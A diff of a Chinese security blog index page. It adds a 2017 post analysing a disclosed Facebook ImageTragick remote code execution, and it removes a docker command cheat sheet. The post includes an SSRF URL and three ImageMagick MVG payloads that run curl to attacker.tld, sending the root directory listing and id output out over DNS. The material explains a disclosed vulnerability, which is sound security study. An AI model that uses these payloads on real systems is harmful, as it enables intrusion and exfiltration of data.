@@ -156,6 +156,85 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-安全测试/facebook命令执行" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2017/01/18/安全测试/facebook命令执行/">facebook 命令执行</a>
+    </h1>
+  
+
+        <a href="/2017/01/18/安全测试/facebook命令执行/" class="archive-article-date">
+  	<time datetime="2017-01-18T03:12:16.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-01-18</time>
+</a>
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>文章地址：<a href="http://4lemon.ru/2017-01-17_facebook_imagetragick_remote_code_execution.html" target="_blank" rel="external">http://4lemon.ru/2017-01-17_facebook_imagetragick_remote_code_execution.html</a></p>
+<p>对文章中的过程进行了简单的分析：</p>
+<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>在facebook分享页面会有个图像的链接地址:</p>
+<p><a href="https://www.facebook.com/dialog/feed?app_id=APP_ID&amp;link=link.example.tld&amp;picture=http%3A%2F%2Fattacker.tld%2Fexploit.png&amp;name=news_name&amp;caption=news_caption&amp;description=news_descriotion&amp;redirect_uri=http%3A%2F%2Fwww.facebook.com&amp;ext=1476569763&amp;hash=" target="_blank" rel="external">https://www.facebook.com/dialog/feed?app_id=APP_ID&amp;link=link.example.tld&amp;picture=http%3A%2F%2Fattacker.tld%2Fexploit.png&amp;name=news_name&amp;caption=news_caption&amp;description=news_descriotion&amp;redirect_uri=http%3A%2F%2Fwww.facebook.com&amp;ext=1476569763&amp;hash=</a></p>
+<p>在页面中会对图像进行处理，变成连接：</p>
+<p><a href="https://external.fhen1-1.fna.fbcdn.net/safe_image.php?d=AQDaeWq2Fn1Ujs4P&amp;w=158&amp;h=158&amp;url=https%3A%2F%2Fwww.google.com%2Fimages%2Ferrors%2Frobot.png&amp;cfs=1&amp;upscale=1&amp;_nc_hash=AQD2uvqIgAdXgWyb" target="_blank" rel="external">https://external.fhen1-1.fna.fbcdn.net/safe_image.php?d=AQDaeWq2Fn1Ujs4P&amp;w=158&amp;h=158&amp;url=https%3A%2F%2Fwww.google.com%2Fimages%2Ferrors%2Frobot.png&amp;cfs=1&amp;upscale=1&amp;_nc_hash=AQD2uvqIgAdXgWyb</a></p>
+<p>源地址为：</p>
+<p><a href="https://www.google.com/images/errors/robot.png" target="_blank" rel="external">https://www.google.com/images/errors/robot.png</a></p>
+<p>注意到一点，源地址图像大小为171×213，而处理后的图像大小为158×158</p>
+<h3 id="SSRF漏洞"><a href="#SSRF漏洞" class="headerlink" title="SSRF漏洞"></a>SSRF漏洞</h3><p><a href="https://external.fhen1-1.fna.fbcdn.net/safe_image.php?d=AQDaeWq2Fn1Ujs4P&amp;w=158&amp;h=158&amp;url=https%3A%2F%2Fwww.google.com%2Fimages%2Ferrors%2Frobot.png&amp;cfs=1&amp;upscale=1&amp;_nc_hash=AQD2uvqIgAdXgWyb" target="_blank" rel="external">https://external.fhen1-1.fna.fbcdn.net/safe_image.php?d=AQDaeWq2Fn1Ujs4P&amp;w=158&amp;h=158&amp;url=https%3A%2F%2Fwww.google.com%2Fimages%2Ferrors%2Frobot.png&amp;cfs=1&amp;upscale=1&amp;_nc_hash=AQD2uvqIgAdXgWyb</a></p>
+<p>url中存在ssrf漏洞</p>
+<h3 id="ImageMagick命令执行"><a href="#ImageMagick命令执行" class="headerlink" title="ImageMagick命令执行"></a>ImageMagick命令执行</h3><p>这个是图像处理时候产生的漏洞，从第一步可以看到图像进行了大小的处理，有可能会存在ImageMagick命令执行</p>
+<p>利用第一个payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">push graphic-context</div><div class="line">viewbox 0 0 640 480</div><div class="line">image over 0,0 0,0 &apos;https://127.0.0.1/x.php?x=%60curl &quot;http://attacker.tld/&quot; -d @- &gt; /dev/null`&apos;</div><div class="line">pop graphic-context</div></pre></td></tr></table></figure>
+<p>没有成功</p>
+<h3 id="利用dns传输"><a href="#利用dns传输" class="headerlink" title="利用dns传输"></a>利用dns传输</h3><p>第二个payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">push graphic-context</div><div class="line">viewbox 0 0 640 480</div><div class="line">image over 0,0 0,0 &apos;https://127.0.0.1/x.php?x=%60curl &quot;http://record_under_attacker_controled_ns_server.attacker.tld/&quot; -d @- &gt; /dev/null`&apos;</div><div class="line">pop graphic-context</div></pre></td></tr></table></figure>
+<p>利用了自己能控制的dns解析，得到结果：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">IP: 31.13.*.*; NetName: LLA1-11</div><div class="line">NAME: record_under_attacker_controled_ns_server.attacker.tld, Type: A</div></pre></td></tr></table></figure>
+<p>命令得到了执行</p>
+<p>第三个payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">push graphic-context</div><div class="line">viewbox 0 0 640 480</div><div class="line">image over 0,0 0,0 &apos;https://127.0.0.1/x.php?x=%60for i in $(ls /) ; do curl &quot;http://$i.attacker.tld/&quot; -d @- &gt; /dev/null; done`&apos;</div><div class="line">pop graphic-context</div></pre></td></tr></table></figure>
+<p>结果：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">NAME: home.attacker.tld, Type: A</div><div class="line">NAME: boot.attacker.tld, Type: 28</div><div class="line">NAME: dev.attacker.tld, Type: 28</div><div class="line">NAME: bin.attacker.tld, Type: A</div><div class="line">…</div></pre></td></tr></table></figure>
+<p>id执行：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">NAME: uid=99(nobody).attacker.tld., Type: 28</div><div class="line">NAME: groups=99(nobody).attacker.tld., Type: A</div><div class="line">NAME: gid=99(nobody).attacker.tld., Type: A</div></pre></td></tr></table></figure>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags"></i>
+		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/安全测试/">安全测试</a></li></ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2017/01/18/安全测试/facebook命令执行/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+
+
+
+
+
+
+
+  
     <article id="post-web安全/Blob_urls" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -1181,81 +1260,6 @@
       
         <p class="article-more-link">
           <a class="article-more-a" href="/2017/01/03/安全测试/常见端口安全测试/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-
-
-
-
-
-
-
-  
-    <article id="post-软件/docker常用命令" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2016/12/21/软件/docker常用命令/">docker 常用命令</a>
-    </h1>
-  
-
-        <a href="/2016/12/21/软件/docker常用命令/" class="archive-article-date">
-  	<time datetime="2016-12-21T03:12:16.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2016-12-21</time>
-</a>
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h4 id="查看镜像"><a href="#查看镜像" class="headerlink" title="查看镜像"></a>查看镜像</h4><p>docker images</p>
-<h4 id="查看运营的容器"><a href="#查看运营的容器" class="headerlink" title="查看运营的容器"></a>查看运营的容器</h4><p>docker ps</p>
-<h4 id="运行-ubuntu"><a href="#运行-ubuntu" class="headerlink" title="运行 ubuntu"></a>运行 ubuntu</h4><p>docker run -i -t daocloud.io/ubuntu:14.04 /bin/bash</p>
-<h4 id="运行ubuntu-退出时自动删除容器"><a href="#运行ubuntu-退出时自动删除容器" class="headerlink" title="运行ubuntu, 退出时自动删除容器"></a>运行ubuntu, 退出时自动删除容器</h4><p>docker run -i -t –rm daocloud.io/ubuntu:14.04 /bin/bash</p>
-<h4 id="切换machine，使用docker-vm"><a href="#切换machine，使用docker-vm" class="headerlink" title="切换machine，使用docker-vm"></a>切换machine，使用docker-vm</h4><p>eval “$(docker-machine env docker-vm)”</p>
-<p>####切换到 dev machine<br>eval “$(docker-machine env dev)”</p>
-<h4 id="停止所有容器"><a href="#停止所有容器" class="headerlink" title="停止所有容器"></a>停止所有容器</h4><p>docker stop $(docker ps -a -q)</p>
-<h4 id="删除指定镜像"><a href="#删除指定镜像" class="headerlink" title="删除指定镜像"></a>删除指定镜像</h4><p>docker rmi $image</p>
-<h4 id="删除无标示镜像，即id为的镜像"><a href="#删除无标示镜像，即id为的镜像" class="headerlink" title="删除无标示镜像，即id为的镜像"></a>删除无标示镜像，即id为<none>的镜像</none></h4><p>docker rmi $(docker images | grep “^<none>“ | awk “{print $3}”)</none></p>
-<h4 id="删除所有镜像"><a href="#删除所有镜像" class="headerlink" title="删除所有镜像"></a>删除所有镜像</h4><p>docker rmi $(docker images -q)</p>
-<h4 id="杀死所有正在运行的容器"><a href="#杀死所有正在运行的容器" class="headerlink" title="杀死所有正在运行的容器"></a>杀死所有正在运行的容器</h4><p>docker kill $(docker ps -a -q)</p>
-<h4 id="删除所有已经停止的容器"><a href="#删除所有已经停止的容器" class="headerlink" title="删除所有已经停止的容器"></a>删除所有已经停止的容器</h4><p>docker rm $(docker ps -a -q)</p>
-<h4 id="删除所有未打-dangling-标签的镜像"><a href="#删除所有未打-dangling-标签的镜像" class="headerlink" title="删除所有未打 dangling 标签的镜像"></a>删除所有未打 dangling 标签的镜像</h4><p>docker rmi $(docker images -q -f dangling=true)</p>
-<h4 id="删除所有镜像-1"><a href="#删除所有镜像-1" class="headerlink" title="删除所有镜像"></a>删除所有镜像</h4><p>docker rmi $(docker images -q)</p>
-<h4 id="查看内存、CPU的使用情况"><a href="#查看内存、CPU的使用情况" class="headerlink" title="查看内存、CPU的使用情况"></a>查看内存、CPU的使用情况</h4><p>docker stats $(docker ps -q)</p>
-<p>CONTAINER           CPU %               MEM USAGE / LIMIT     MEM %               NET I/O               BLOCK I/O<br>452bc3877700        0.03%               480.2 MB / 1.044 GB   45.98%              2.028 kB / 648 B      0 B / 0 B<br>c2c1dda7e9bb        0.01%               11.93 MB / 1.044 GB   1.14%               7.096 kB / 3.522 kB   0 B / 0 B<br>f35f291d6659        0.00%               9.806 MB / 1.044 GB   0.94%               8.638 kB / 8.422 kB   0 B / 0 B<br>docker-machine</p>
-<h4 id="查看机器列表"><a href="#查看机器列表" class="headerlink" title="查看机器列表"></a>查看机器列表</h4><p>docker-machine  ls<br>NAME      ACTIVE   DRIVER       STATE     URL                         SWARM   DOCKER    ERRORS<br>default   *        virtualbox   Running   tcp://192.168.99.100:2376           v1.10.3</p>
-<h4 id="查看机器状态"><a href="#查看机器状态" class="headerlink" title="查看机器状态"></a>查看机器状态</h4><p>docker-machine status default</p>
-<h4 id="登录机器default"><a href="#登录机器default" class="headerlink" title="登录机器default"></a>登录机器default</h4><p>docker-machine ssh default<br>docker-compose</p>
-<h4 id="查看运行中的容器"><a href="#查看运行中的容器" class="headerlink" title="查看运行中的容器"></a>查看运行中的容器</h4><p>docker-compose ps</p>
-<h2 id="Name-Command-State-Ports"><a href="#Name-Command-State-Ports" class="headerlink" title="Name                     Command             State               Ports"></a>Name                     Command             State               Ports</h2><p>dockerfiles_mysql_1   docker-entrypoint.sh mysqld   Up      0.0.0.0:3306-&gt;3306/tcp<br>dockerfiles_nginx_1   nginx -g daemon off;          Up      443/tcp, 0.0.0.0:8080-&gt;80/tcp<br>dockerfiles_php_1     php-fpm                       Up      0.0.0.0:9000-&gt;9000/tcp</p>
-<h4 id="运行容器"><a href="#运行容器" class="headerlink" title="运行容器"></a>运行容器</h4><p>docker-compose up</p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags"></i>
-		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/软件/">软件</a></li></ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2016/12/21/软件/docker常用命令/">展开全文 >></a>
         </p>
       
 
